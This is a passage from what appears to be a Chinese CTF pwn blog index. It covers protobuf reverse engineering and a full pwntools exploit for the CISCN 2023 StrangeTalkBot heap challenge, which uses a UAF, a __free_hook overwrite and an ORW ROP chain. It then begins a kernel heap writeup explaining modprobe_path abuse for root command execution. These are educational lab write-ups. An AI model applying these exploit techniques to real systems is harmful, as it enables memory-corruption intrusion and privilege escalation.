p64(fake_link_map_addr)+p64(0)r.sendline(payload)r.interactive()\n\n参考链接https://blog.csdn.net/seaaseesa/article/details/104478081\nhttps://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/#second-try-no-leak\nhttps://blog.csdn.net/jzc020121/article/details/116312592#t3\n","categories":["pwn"],"tags":["ret2dl-runtime-resolve"]},{"title":"关于protobuf的解题步骤","url":"/2023/05/30/protobuf/","content":"前言其实在以前已经多次遇见过protobuf了，但是都不太在意因为总感觉会像musl库一样，存活一段时间后就消失了。所以也导致我一直没有去真正做过这样的题，这次国赛第一天恰好出现了这样一道题，不出意外没能解出来，如果不看wp我可能还会怀疑自己的逆向能力，因为我蠢到看了几个小时的1200多行代码。最可恶的是当初不想玩web的一大原因就是我比较粗心大意，面对信息收集时往往会忽略掉重要信息，但是现在的pwn也越来越往这个方向靠了。不可否认的是，这提升了选手的综合实力(恶心选手)，只是我不太能接受从一个坑又跳到了另外一个坑里面去了。不过，需要认清现实的是我的逆向水平确实很差，我也准备开始刷逆向题了。\nprotobuf什么是protobufProtocol Buffers，是Google公司开发的一种数据描述语言，类似于XML能够将结构化数据序列化，可用于数据存储、通信协议等方面。它不依赖于语言和平台并且可扩展性极强。\n同XML相比，Protocol buffers在序列化结构化数据方面有许多优点：\n\n  更简单\n  数据描述文件只需原来的1/10至1/3\n  解析速度是原来的20倍至100倍\n  减少了二义性\n  生成了更容易在编程中使用的数据访问\n支持多种编程语言   （转自百度百科）\n\n这里就不多提了，安装的话自己搜一下就有的。\n使用protobuf首先编写一个测试文件test.proto\nsyntax = &quot;proto2&quot;;message test&#123;\trequired int64 aaa = 1;\trequired uint64 bbb = 2;\trequired sint64 ccc = 3;\trequired bytes ddd = 4;&#125;\n\n使用protoc --c_out=. ./test.proto命令生成对应代码\n/* Generated by the protocol buffer compiler.  DO NOT EDIT! *//* Generated from: test.proto */#ifndef PROTOBUF_C_test_2eproto__INCLUDED#define PROTOBUF_C_test_2eproto__INCLUDED#include &lt;protobuf-c/protobuf-c.h&gt;PROTOBUF_C__BEGIN_DECLS#if PROTOBUF_C_VERSION_NUMBER &lt; 1000000# error This file was generated by a newer version of protoc-c which is incompatible with your libprotobuf-c headers. Please update your headers.#elif 1003003 &lt; PROTOBUF_C_MIN_COMPILER_VERSION# error This file was generated by an older version of protoc-c which is incompatible with your libprotobuf-c headers. Please regenerate this file with a newer version of protoc-c.#endiftypedef struct _Test Test;/* --- enums --- *//* --- messages --- */struct  _Test&#123;  ProtobufCMessage base;  int64_t aaa;  uint64_t bbb;  int64_t ccc;  ProtobufCBinaryData ddd;&#125;;#define TEST__INIT \\ &#123; PROTOBUF_C_MESSAGE_INIT (&amp;test__descriptor) \\    , 0, 0, 0, &#123;0,NULL&#125; &#125;/* Test methods */void   test__init                     (Test         *message);size_t test__get_packed_size                     (const Test   *message);size_t test__pack                     (const Test   *message,                      uint8_t             *out);size_t test__pack_to_buffer                     (const Test   *message,                      ProtobufCBuffer     *buffer);Test *       test__unpack                     (ProtobufCAllocator  *allocator,                      size_t               len,                      const uint8_t       *data);void   test__free_unpacked                     (Test *message,                      ProtobufCAllocator *allocator);/* --- per-message closures --- */typedef void (*Test_Closure)                 (const Test *message,                  void *closure_data);/* --- services --- *//* --- descriptors --- */extern const ProtobufCMessageDescriptor test__descriptor;PROTOBUF_C__END_DECLS#endif  /* PROTOBUF_C_test_2eproto__INCLUDED */\n\n这是test.pb-c.h文件，可以看到其中定义了许多的函数，并且定义了结构体。\n/* Generated by the protocol buffer compiler.  DO NOT EDIT! *//* Generated from: test.proto *//* Do not generate deprecated warnings for self */#ifndef PROTOBUF_C__NO_DEPRECATED#define PROTOBUF_C__NO_DEPRECATED#endif#include &quot;test.pb-c.h&quot;void   test__init                     (Test         *message)&#123;  static const Test init_value = TEST__INIT;  *message = init_value;&#125;size_t test__get_packed_size                     (const Test *message)&#123;  assert(message-&gt;base.descriptor == &amp;test__descriptor);  return protobuf_c_message_get_packed_size ((const ProtobufCMessage*)(message));&#125;size_t test__pack                     (const Test *message,                      uint8_t       *out)&#123;  assert(message-&gt;base.descriptor == &amp;test__descriptor);  return protobuf_c_message_pack ((const ProtobufCMessage*)message, out);&#125;size_t test__pack_to_buffer                     (const Test *message,                      ProtobufCBuffer *buffer)&#123;  assert(message-&gt;base.descriptor == &amp;test__descriptor);  return protobuf_c_message_pack_to_buffer ((const ProtobufCMessage*)message, buffer);&#125;Test *       test__unpack                     (ProtobufCAllocator  *allocator,                      size_t               len,                      const uint8_t       *data)&#123;  return (Test *)     protobuf_c_message_unpack (&amp;test__descriptor,                                allocator, len, data);&#125;void   test__free_unpacked                     (Test *message,                      ProtobufCAllocator *allocator)&#123;  if(!message)    return;  assert(message-&gt;base.descriptor == &amp;test__descriptor);  protobuf_c_message_free_unpacked ((ProtobufCMessage*)message, allocator);&#125;static const ProtobufCFieldDescriptor test__field_descriptors[4] =&#123;  &#123;    &quot;aaa&quot;,    1,    PROTOBUF_C_LABEL_REQUIRED,    PROTOBUF_C_TYPE_INT64,    0,   /* quantifier_offset */    offsetof(Test, aaa),    NULL,    NULL,    0,             /* flags */    0,NULL,NULL    /* reserved1,reserved2, etc */  &#125;,  &#123;    &quot;bbb&quot;,    2,    PROTOBUF_C_LABEL_REQUIRED,    PROTOBUF_C_TYPE_UINT64,    0,   /* quantifier_offset */    offsetof(Test, bbb),    NULL,    NULL,    0,             /* flags */    0,NULL,NULL    /* reserved1,reserved2, etc */  &#125;,  &#123;    &quot;ccc&quot;,    3,    PROTOBUF_C_LABEL_REQUIRED,    PROTOBUF_C_TYPE_SINT64,    0,   /* quantifier_offset */    offsetof(Test, ccc),    NULL,    NULL,    0,             /* flags */    0,NULL,NULL    /* reserved1,reserved2, etc */  &#125;,  &#123;    &quot;ddd&quot;,    4,    PROTOBUF_C_LABEL_REQUIRED,    PROTOBUF_C_TYPE_BYTES,    0,   /* quantifier_offset */    offsetof(Test, ddd),    NULL,    NULL,    0,             /* flags */    0,NULL,NULL    /* reserved1,reserved2, etc */  &#125;,&#125;;static const unsigned test__field_indices_by_name[] = &#123;  0,   /* field[0] = aaa */  1,   /* field[1] = bbb */  2,   /* field[2] = ccc */  3,   /* field[3] = ddd */&#125;;static const ProtobufCIntRange test__number_ranges[1 + 1] =&#123;  &#123; 1, 0 &#125;,  &#123; 0, 4 &#125;&#125;;const ProtobufCMessageDescriptor test__descriptor =&#123;  PROTOBUF_C__MESSAGE_DESCRIPTOR_MAGIC,  &quot;test&quot;,  &quot;Test&quot;,  &quot;Test&quot;,  &quot;&quot;,  sizeof(Test),  4,  test__field_descriptors,  test__field_indices_by_name,  1,  test__number_ranges,  (ProtobufCMessageInit) test__init,  NULL,NULL,NULL    /* reserved[123] */&#125;;\n\n这个文件就是test.pb-c.c文件，内部对test__field_descriptors数组进行了复制，这里使用的结构体为ProtobufCFieldDescriptor\nstruct ProtobufCFieldDescriptor &#123;\t/** Name of the field as given in the .proto file. */\tconst char\t\t*name;\t/** Tag value of the field as given in the .proto file. */\tuint32_t\t\tid;\t/** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */\tProtobufCLabel\t\tlabel;\t/** The type of the field. */\tProtobufCType\t\ttype;\t/**\t * The offset in bytes of the message&#x27;s C structure&#x27;s quantifier field\t * (the `has_MEMBER` field for optional members or the `n_MEMBER` field\t * for repeated members or the case enum for oneofs).\t */\tunsigned\t\tquantifier_offset;\t/**\t * The offset in bytes into the message&#x27;s C structure for the member\t * itself.\t */\tunsigned\t\toffset;\t/**\t * A type-specific descriptor.\t *\t * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the\t * corresponding `ProtobufCEnumDescriptor`.\t *\t * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to\t * the corresponding `ProtobufCMessageDescriptor`.\t *\t * Otherwise this field is NULL.\t */\tconst void\t\t*descriptor; /* for MESSAGE and ENUM types */\t/** The default value for this field, if defined. May be NULL. */\tconst void\t\t*default_value;\t/**\t * A flag word. Zero or more of the bits defined in the\t * `ProtobufCFieldFlag` enum may be set.\t */\tuint32_t\t\tflags;\t/** Reserved for future use. */\tunsigned\t\treserved_flags;\t/** Reserved for future use. */\tvoid\t\t\t*reserved2;\t/** Reserved for future use. */\tvoid\t\t\t*reserved3;&#125;;\n\n而这个结构体中的type就是数据的类型，需要注意的是，我们在proto文件中，分别定义了int64和sint64虽然结构体中都被翻译成了int64_t类型，但是可以在test.pb-c.c文件中看到，他们在上述结构体中的type值是不一样的。\ntypedef enum &#123;\tPROTOBUF_C_TYPE_INT32,      /**&lt; int32 */\tPROTOBUF_C_TYPE_SINT32,     /**&lt; signed int32 */\tPROTOBUF_C_TYPE_SFIXED32,   /**&lt; signed int32 (4 bytes) */\tPROTOBUF_C_TYPE_INT64,      /**&lt; int64 */\tPROTOBUF_C_TYPE_SINT64,     /**&lt; signed int64 */\tPROTOBUF_C_TYPE_SFIXED64,   /**&lt; signed int64 (8 bytes) */\tPROTOBUF_C_TYPE_UINT32,     /**&lt; unsigned int32 */\tPROTOBUF_C_TYPE_FIXED32,    /**&lt; unsigned int32 (4 bytes) */\tPROTOBUF_C_TYPE_UINT64,     /**&lt; unsigned int64 */\tPROTOBUF_C_TYPE_FIXED64,    /**&lt; unsigned int64 (8 bytes) */\tPROTOBUF_C_TYPE_FLOAT,      /**&lt; float */\tPROTOBUF_C_TYPE_DOUBLE,     /**&lt; double */\tPROTOBUF_C_TYPE_BOOL,       /**&lt; boolean */\tPROTOBUF_C_TYPE_ENUM,       /**&lt; enumerated type */\tPROTOBUF_C_TYPE_STRING,     /**&lt; UTF-8 or ASCII string */\tPROTOBUF_C_TYPE_BYTES,      /**&lt; arbitrary byte sequence */\tPROTOBUF_C_TYPE_MESSAGE,    /**&lt; nested message */&#125; ProtobufCType;\n\n而这里type值的定义是这样的，知道这个很重要，在后续的做题环节中需要。\n然而，这种题目一般来说都是用户态的题目，而面对用户态题目我们写的脚本更多的是使用python去写，这里同样可以使用protoc工具生成python文件可以引入的文件。命令为:protoc --python_out=. ./test.proto\nStrangeTalkBot这道题是ciscn2023的第二道pwn题。\n题目分析void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123;  ssize_t v3; // rsi  _QWORD *v4; // [rsp+8h] [rbp-8h]  init_io();  while ( 1 )  &#123;    memset(&amp;byte_A060, 0, 0x400uLL);    puts(&quot;You can try to have friendly communication with me now: &quot;);    v3 = read(0, &amp;byte_A060, 0x400uLL);    v4 = (_QWORD *)sub_192D(0LL, v3, &amp;byte_A060);    if ( !v4 )      break;    sub_155D(v4[3], v4[4], v4[5], v4[6], v4[7]);  &#125;  errExit(0LL, v3);&#125;\n\n可以看到，题目主干比较清晰。\nchar *__fastcall sub_155D(        __int64 opt,        unsigned __int64 idx,        __int64 chunk_size,        __int64 content_size,        const void *content)&#123;  size_t size; // [rsp+18h] [rbp-18h]  size = chunk_size;  if ( idx &gt;= 0x21 )    errExit();  if ( (unsigned __int64)content_size &gt;= 0xF1 )    errExit();  if ( (unsigned __int64)chunk_size &gt;= 0xF1 )    errExit();  if ( chunk_size &lt; content_size )    size = content_size;  if ( opt == 4 )    return delete(idx);  if ( opt &gt; 4 )    goto LABEL_19;  if ( opt == 3 )    return (char *)show(idx);  if ( opt == 1 )    return (char *)create(idx, size, content_size, content);  if ( opt != 2 )LABEL_19:    errExit();  return (char *)edit(idx, content_size, content);&#125;\n\n而在这个函数内部其实就是很经典的菜单类堆题，并且题目中的漏洞也很简单，就是一个很单纯的UAF。麻烦的是sub_192D函数内部的sub_5090有很长的代码。虽然我也不知道怎么猜的，但是他就是protobuf对应的unpack函数。\n理解题目中的protobuf需要理解的话，首先就是需要确定题目中各个函数的含义以及部分可能需要知道的结构体。\n__int64 __fastcall sub_192D(__int64 a1, __int64 a2, __int64 a3)&#123;  return sub_5090(&amp;unk_9C80, a1, a2, a3);&#125;\n\n可以看到这个函数内部只是调用了另外一个函数，并且返回出另外函数的返回值。\nchar *__fastcall sub_5090(        const ProtobufCMessageDescriptor *desc,        ProtobufCAllocator *a2,        unsigned __int64 count,        unsigned __int8 *content)\n\n然而这个函数的返回值是一个指针(参数的类型都是已经经过了我的修改了)。其实通过对比可以发现结构很类似上述中的unpack函数。\nTest *test__unpack(ProtobufCAllocator  *allocator, size_t len, const uint8_t *data)&#123;  return (Test *) protobuf_c_message_unpack (&amp;test__descriptor, allocator, len, data);&#125;\n\n当然，可以通过搜索其内部的字符串\nactionid_str = desc-&gt;fields_sorted_by_name;canary = __readfsqword(0x28u);if ( desc-&gt;magic != 0x28AAEEF9 )  __assert_fail(  &quot;(desc)-&gt;magic == BINARYBF_C__MESSAGE_DESCRIPTOR_MAGIC&quot;,  &quot;BINARYBF-c/BINARYBF-c.c&quot;,  0xBF2u,  &quot;BINARYBF_c_message_unpack&quot;);\n\n比如函数开头的assert即可搜索到其源码位置。所以这个1200多行的函数其实就是protobuf_c_message_unpack函数。\n那么就可以通过这个函数所使用的参数，直接在ida中添加结构体进行进一步分析。\n00000000 ProtobufCMessageDescriptor struc ; (sizeof=0x78, mappedto_19)00000000 magic dd ?00000004 name dq ?0000000C short_name dq ?00000014 c_name dq ?0000001C package_name dq ?00000024 sizeof_message dq ?0000002C n_fields dd ?00000030 fields dq ?00000038 fields_sorted_by_name dq ?00000040 n_field_ranges dd ?00000044 field_ranges dq ?0000004C message_init ProtobufCMessage ?00000060 reserved1 dq ?00000068 reserved2 dq ?00000070 reserved3 dq ?00000078 ProtobufCMessageDescriptor ends0000007800000000 ; ---------------------------------------------------------------------------0000000000000000 ProtobufCMessage struc ; (sizeof=0x14, mappedto_21)00000000                                         ; XREF: ProtobufCMessageDescriptor/r00000000 descriptor dq ?00000008 n_unknown_fields dd ?0000000C unknown_fields dq ?00000014 ProtobufCMessage ends0000001400000000 ; ---------------------------------------------------------------------------0000000000000000 ProtobufCAllocator struc ; (sizeof=0x18, mappedto_22)00000000 alloc dq ?00000008 free dq ?00000010 allocator_data dq ?00000018 ProtobufCAllocator ends0000001800000000 ; ---------------------------------------------------------------------------0000000000000000 ProtobufCFieldDescriptor struc ; (sizeof=0x44, mappedto_23)00000000                                         ; XREF: .data.rel.ro:stru_9B60/r00000000 name dq ?00000008 id dd ?0000000C label dd ?00000010 type dd ?00000014 quantifier_offset dd ?00000018 offset dd ?0000001C descriptor dq ?00000024 default_value dq ?0000002C flags dd ?00000030 reserved_flags dd ?00000034 reserved2 dq ?0000003C reserved3 dq ?00000044 ProtobufCFieldDescriptor ends\n\n在前面我们提到了ProtobufCFieldDescriptor结构体，这个结构体中存储着结构体中所有成员的数据类型，并且第一个成员是指向其名字的地址，那么我们可以根据字符串找到结构体相印的位置。\n.data.rel.ro:0000000000009B60 80 70 00 00 00 00 00 00 01 00+stru_9B60 ProtobufCFieldDescriptor &lt;7080h, 1, 0, 4, 0, 18h, 0, 0, 0, 0, 0, 0&gt;.data.rel.ro:0000000000009B60 00 00 00 00 00 00 04 00 00 00+                                        ; DATA XREF: .data.rel.ro:0000000000009CB8↓o.data.rel.ro:0000000000009BA4 00                            db    0.data.rel.ro:0000000000009BA5 00                            db    0.data.rel.ro:0000000000009BA6 00                            db    0.data.rel.ro:0000000000009BA7 00                            db    0.data.rel.ro:0000000000009BA8                               ; ProtobufCFieldDescriptor.data.rel.ro:0000000000009BA8 89 70 00 00 00 00 00 00 02 00+ProtobufCFieldDescriptor &lt;7089h, 2, 0, 4, 0, 20h, 0, 0, 0, 0, 0, 0&gt;.data.rel.ro:0000000000009BEC 00                            db    0.data.rel.ro:0000000000009BED 00                            db    0.data.rel.ro:0000000000009BEE 00                            db    0.data.rel.ro:0000000000009BEF 00                            db    0.data.rel.ro:0000000000009BF0                               ; ProtobufCFieldDescriptor.data.rel.ro:0000000000009BF0 90 70 00 00 00 00 00 00 03 00+ProtobufCFieldDescriptor &lt;7090h, 3, 0, 4, 0, 28h, 0, 0, 0, 0, 0, 0&gt;.data.rel.ro:0000000000009C34 00                            db    0.data.rel.ro:0000000000009C35 00                            db    0.data.rel.ro:0000000000009C36 00                            db    0.data.rel.ro:0000000000009C37 00                            db    0.data.rel.ro:0000000000009C38                               ; ProtobufCFieldDescriptor.data.rel.ro:0000000000009C38 98 70 00 00 00 00 00 00 04 00+ProtobufCFieldDescriptor &lt;7098h, 4, 0, 0Fh, 0, 30h, 0, 0, 0, 0, 0, 0&gt;\n\n最终可以得出，前面三个成员的数据类型为sint64，最后一个成员的数据类型为bytes，所以可以自己写出proto文件了。\nsyntax = &quot;proto2&quot;;message Devicemsg&#123;\trequired sint64 actionid = 1;\trequired sint64 msgidx = 2;\trequired sint64 msgsize = 3;\trequired bytes msgcontent = 4;&#125;\n\n然后使用上述代码生成python对应的文件。\n# Generated by the protocol buffer compiler.  DO NOT EDIT!# source: Devicemsg.protoimport sys_b=sys.version_info[0]&lt;3 and (lambda x:x) or (lambda x:x.encode(&#x27;latin1&#x27;))from google.protobuf import descriptor as _descriptorfrom google.protobuf import message as _messagefrom google.protobuf import reflection as _reflectionfrom google.protobuf import symbol_database as _symbol_database# @@protoc_insertion_point(imports)_sym_db = _symbol_database.Default()DESCRIPTOR = _descriptor.FileDescriptor(  name=&#x27;Devicemsg.proto&#x27;,  package=&#x27;&#x27;,  syntax=&#x27;proto2&#x27;,  serialized_options=None,  serialized_pb=_b(&#x27;\\n\\x0f\\x44\\x65vicemsg.proto\\&quot;R\\n\\tDevicemsg\\x12\\x10\\n\\x08\\x61\\x63tionid\\x18\\x01 \\x02(\\x12\\x12\\x0e\\n\\x06msgidx\\x18\\x02 \\x02(\\x12\\x12\\x0f\\n\\x07msgsize\\x18\\x03 \\x02(\\x12\\x12\\x12\\n\\nmsgcontent\\x18\\x04 \\x02(\\x0c&#x27;))_DEVICEMSG = _descriptor.Descriptor(  name=&#x27;Devicemsg&#x27;,  full_name=&#x27;Devicemsg&#x27;,  filename=None,  file=DESCRIPTOR,  containing_type=None,  fields=[    _descriptor.FieldDescriptor(      name=&#x27;actionid&#x27;, full_name=&#x27;Devicemsg.actionid&#x27;, index=0,      number=1, type=18, cpp_type=2, label=2,      has_default_value=False, default_value=0,      message_type=None, enum_type=None, containing_type=None,      is_extension=False, extension_scope=None,      serialized_options=None, file=DESCRIPTOR),    _descriptor.FieldDescriptor(      name=&#x27;msgidx&#x27;, full_name=&#x27;Devicemsg.msgidx&#x27;, index=1,      number=2, type=18, cpp_type=2, label=2,      has_default_value=False, default_value=0,      message_type=None, enum_type=None, containing_type=None,      is_extension=False, extension_scope=None,      serialized_options=None, file=DESCRIPTOR),    _descriptor.FieldDescriptor(      name=&#x27;msgsize&#x27;, full_name=&#x27;Devicemsg.msgsize&#x27;, index=2,      number=3, type=18, cpp_type=2, label=2,      has_default_value=False, default_value=0,      message_type=None, enum_type=None, containing_type=None,      is_extension=False, extension_scope=None,      serialized_options=None, file=DESCRIPTOR),    _descriptor.FieldDescriptor(      name=&#x27;msgcontent&#x27;, full_name=&#x27;Devicemsg.msgcontent&#x27;, index=3,      number=4, type=12, cpp_type=9, label=2,      has_default_value=False, default_value=_b(&quot;&quot;),      message_type=None, enum_type=None, containing_type=None,      is_extension=False, extension_scope=None,      serialized_options=None, file=DESCRIPTOR),  ],  extensions=[  ],  nested_types=[],  enum_types=[  ],  serialized_options=None,  is_extendable=False,  syntax=&#x27;proto2&#x27;,  extension_ranges=[],  oneofs=[  ],  serialized_start=19,  serialized_end=101,)DESCRIPTOR.message_types_by_name[&#x27;Devicemsg&#x27;] = _DEVICEMSG_sym_db.RegisterFileDescriptor(DESCRIPTOR)Devicemsg = _reflection.GeneratedProtocolMessageType(&#x27;Devicemsg&#x27;, (_message.Message,), dict(  DESCRIPTOR = _DEVICEMSG,  __module__ = &#x27;Devicemsg_pb2&#x27;  # @@protoc_insertion_point(class_scope:Devicemsg)  ))_sym_db.RegisterMessage(Devicemsg)# @@protoc_insertion_point(module_scope)\n\n现在就只需要拿着这个文件去使用即可，后续的漏洞利用部分比较简单，这里就不详细说了。\n综上可得，expfrom pwn import *import Devicemsg_pb2elf = ELF(&#x27;./pwn&#x27;)r = process(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]context.arch = &#x27;amd64&#x27;def create(idx, size, content=b&#x27;&#x27;):    msg = Devicemsg_pb2.Devicemsg()    msg.actionid = 1    msg.msgidx = idx    msg.msgsize = size    msg.msgcontent = content    r.recvuntil(b&#x27;You can try to have friendly communication with me now: &#x27;)    r.send(msg.SerializeToString())def edit(idx, content):    msg = Devicemsg_pb2.Devicemsg()    msg.actionid = 2    msg.msgidx = idx    msg.msgsize = 0    msg.msgcontent = content    r.recvuntil(b&#x27;You can try to have friendly communication with me now: &#x27;)    r.send(msg.SerializeToString())def show(idx):    msg = Devicemsg_pb2.Devicemsg()    msg.actionid = 3    msg.msgidx = idx    msg.msgsize = 0    msg.msgcontent = b&#x27;&#x27;    r.recvuntil(b&#x27;You can try to have friendly communication with me now: &#x27;)    r.send(msg.SerializeToString())def delete(idx):    msg = Devicemsg_pb2.Devicemsg()    msg.actionid = 4    msg.msgidx = idx    msg.msgsize = 0    msg.msgcontent = b&#x27;&#x27;    r.recvuntil(b&#x27;You can try to have friendly communication with me now: &#x27;)    r.send(msg.SerializeToString())for i in range(8):    create(i, 0xf0)for i in range(8):    delete(7-i)show(0)r.recvline()r.recv(0x50)libc_base = u64(r.recv(8)) - 0x1ecbe0print(&quot;libc_base =&gt; &quot;, hex(libc_base))show(1)r.recvline()heap_base = u64(r.recv(8)) - 0x590print(&quot;heap_base =&gt; &quot;, hex(heap_base))setcontext = libc_base + libc.symbols[&#x27;setcontext&#x27;] + 61__free_hook = libc_base + libc.symbols[&#x27;__free_hook&#x27;]open_addr = libc_base + libc.symbols[&#x27;open&#x27;]read_addr = libc_base + libc.symbols[&#x27;read&#x27;]puts_addr = libc_base + libc.symbols[&#x27;puts&#x27;]ret_addr = libc_base + 0x0000000000022679pop_rdi = libc_base + 0x0000000000023b6apop_rsi = libc_base + 0x000000000002601fpop_rdx = libc_base + 0x0000000000142c92magic_gadget = libc_base + 0x151990edit(1, flat(__free_hook, 0))create(8, 0xf0)create(9, 0xf0, flat(magic_gadget))flag_addr = heap_base + 0x440rop_chain = b&#x27;&#x27;rop_chain += flat(pop_rdi, flag_addr, pop_rsi, 2, open_addr)rop_chain += flat(pop_rdi, 3, pop_rsi, libc_base +                  libc.bss() + 0x500, pop_rdx, 0x50, read_addr)rop_chain += flat(pop_rdi, libc_base + libc.bss() + 0x500, puts_addr)payload = flat(b&#x27;./flag&#x27;+b&#x27;\\x00&#x27;*2, flag_addr)payload = payload.ljust(0x20, b&#x27;\\x00&#x27;) + flat(setcontext)payload = payload.ljust(0x28, b&#x27;\\x00&#x27;) + rop_chainpayload = payload.ljust(0xa0, b&#x27;\\x00&#x27;) + flat(flag_addr + 0x28, ret_addr)edit(8, payload)delete(8)r.interactive()\n\n\n参考链接：\n​    https://xp0int.top/posts/2023/05/28/2023-CISCN-%E5%88%9D%E8%B5%9B-Writeup-By-Xp0int/#42-strangetalkbot\n​    https://github1s.com/protobuf-c/protobuf-c/blob/HEAD/protobuf-c/protobuf-c.c#L3028\n​    https://www.jianshu.com/p/a7e88cb17031\n","categories":["pwn"],"tags":["UAF","protobuf"]},{"title":"starCTF 2019 hackme","url":"/2022/08/10/starCTF-2019-hackme/","content":"题目分析这道题依旧是一道kernel的堆题，题目很简单这里简单分析一下\n__int64 __fastcall hackme_ioctl(__int64 a1, unsigned int a2, __int64 a3)&#123;    __int64 v3; // rax    __int64 v4; // rsi    __int64 *v5; // rax    __int64 v7; // rax    __int64 v8; // rdi    __int64 *v9; // rax    __int64 size; // r12    __int64 content; // r13    __int64 *v12; // rbx    __int64 v13; // rbx    __int64 v14; // rdi    __int64 *v15; // rbx    __int64 v16; // rax    arg v17; // [rsp+0h] [rbp-38h] BYREF    copy_from_user(&amp;v17, a3, 0x20LL);    if ( a2 == 0x30001 )    &#123;        v13 = 2LL * LODWORD(v17.idx);        v14 = pool[v13];        v15 = &amp;pool[v13];        if ( v14 )        &#123;            kfree();            *v15 = 0LL;            return 0LL;        &#125;        return -1LL;    &#125;    if ( a2 &gt; 0x30001 )    &#123;        if ( a2 == 0x30002 )        &#123;            v7 = 2LL * LODWORD(v17.idx);            v8 = pool[v7];            v9 = &amp;pool[v7];            if ( v8 &amp;&amp; v17.offset + v17.size &lt;= (unsigned __int64)v9[1] )            &#123;                copy_from_user(v17.offset + v8, v17.content, v17.size);                return 0LL;            &#125;        &#125;        else if ( a2 == 0x30003 )        &#123;            v3 = 2LL * LODWORD(v17.idx);            v4 = pool[v3];            v5 = &amp;pool[v3];            if ( v4 )            &#123;                if ( v17.offset + v17.size &lt;= (unsigned __int64)v5[1] )                &#123;                    copy_to_user(v17.content, v17.offset + v4, v17.size);                    return 0LL;                &#125;            &#125;        &#125;        return -1LL;    &#125;    if ( a2 != 0x30000 )        return -1LL;    size = v17.size;    content = v17.content;    v12 = &amp;pool[2 * LODWORD(v17.idx)];    if ( *v12 )        return -1LL;    v16 = _kmalloc(v17.size, 0x6000C0LL);    if ( !v16 )        return -1LL;    *v12 = v16;    copy_from_user(v16, content, size);    v12[1] = size;    return 0LL;&#125;\n\n00000000 arg struc ; (sizeof=0x20, mappedto_4)   ; XREF: hackme_ioctl/r00000000 idx dq ?                                ; XREF: hackme_ioctl+46/r00000000                                         ; hackme_ioctl:loc_8E/r ...00000008 content dq ?                            ; XREF: hackme_ioctl+51/r00000008                                         ; hackme_ioctl+99/r ...00000010 size dq ?                               ; XREF: hackme_ioctl+4D/r00000010                                         ; hackme_ioctl+95/r ...00000018 offset dq ?                             ; XREF: hackme_ioctl+49/r00000018                                         ; hackme_ioctl+91/r00000020 arg ends\n\n下面是分析出来的结构体，可以看到题目实现了四个较为基本的功能，增加堆块，删除堆块，修改堆块，读取堆块。\n漏洞分析这里需要注意的对于读写的时候检测offset的方式是 offset+size&lt;(unsigned __int64)size 这里可以看出来存在向上溢出任意地址的读和写。\nkernel使用的堆分配机制是Buddy System和Slab分配器。而Slab分配器是类似于ptmalloc中的fastbin。kmem_cache_cpu中的freelist指向一个slab中第一个空闲的object，接着object存在指针指向后面空闲的object。而这个指针是很类似于fastbin，我们如果修改的话可以实现任意地址分配堆块。\nmodprobe_path利用原理首先，什么是modprobe呢？根据维基百科的说法：“modprobe是一个Linux程序，最初由Rusty Russell编写，用于在Linux内核中添加一个可加载的内核模块，或者从内核中移除一个可加载的内核模块”。也就是说，它是我们在Linux内核中安装或卸载新模块时都要执行的一个程序。该程序的路径是一个内核全局变量，默认为/sbin/modprobe\nmodprobe的路径, 默认是/sbin/modprobe, 存放在内核本身的符号modprobe_path下, 同时，它位于一个可写的内存页中。我们可以通过读取/proc/kallsyms得到它的地址\n其次，当我们执行的文件的类型是系统未知的类型时，将执行modprobe程序（其路径存储在modprobe_path中）。 更准确地说，如果我们对文件签名（又称魔术头）为系统未知的文件调用execve()函数时，它将调用下列函数，并最终调用modprobe\ndo_execve()=&gt;do_execveat_common()=&gt;bprm_execve()=&gt;exec_binprm()=&gt;search_binary_handler()=&gt;request_module()=&gt;call_modprobe()\n所有这些调用最终将执行下面的代码：\nstatic int call_modprobe(char *module_name, int wait)&#123;\tstruct subprocess_info *info;\tstatic char *envp[] = &#123;\t\t&quot;HOME=/&quot;,\t\t&quot;TERM=linux&quot;,\t\t&quot;PATH=/sbin:/usr/sbin:/bin:/usr/bin&quot;,\t\tNULL\t&#125;;\tchar **argv = kmalloc(sizeof(char *[5]), GFP_KERNEL);\tif (!argv)\t\tgoto out;\tmodule_name = kstrdup(module_name, GFP_KERNEL);\tif (!module_name)\t\tgoto free_argv;\targv[0] = modprobe_path;\targv[1] = &quot;-q&quot;;\targv[2] = &quot;--&quot;;\targv[3] = module_name;\t/* check free_modprobe_argv() */\targv[4] = NULL;\tinfo = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,\t\t\t\t\t NULL, free_modprobe_argv, NULL);\tif (!info)\t\tgoto free_module_name;\treturn call_usermodehelper_exec(info, wait | UMH_KILLABLE);free_module_name:\tkfree(module_name);free_argv:\tkfree(argv);out:\treturn -ENOMEM;&#125;\n\n在这篇文章中 kernel pwn内存任意读写提升权限[2] 提到了call_usermodehelper函数，这个函数可以在内核中直接新建和运行用户空间程序，并且该程序具有root权限，因此只要将参数传递正确就可以执行任意命令。然而这个函数的定义可以看出来也是调用了call_usermodehelper_setup和call_usermodehelper_exec，所以猜测这一函数也可以达到一样的效果，结果也证明事实确实如此\nint call_usermodehelper(char *path, char **argv, char **envp, int wait)&#123;\tstruct subprocess_info *info;\tgfp_t gfp_mask = (wait == UMH_NO_WAIT) ? GFP_ATOMIC : GFP_KERNEL;\tinfo = call_usermodehelper_setup(path, argv, envp, gfp_mask,\t\t\t\t\t NULL, NULL, NULL);\tif (info == NULL)\t\treturn -ENOMEM;\treturn call_usermodehelper_exec(info, 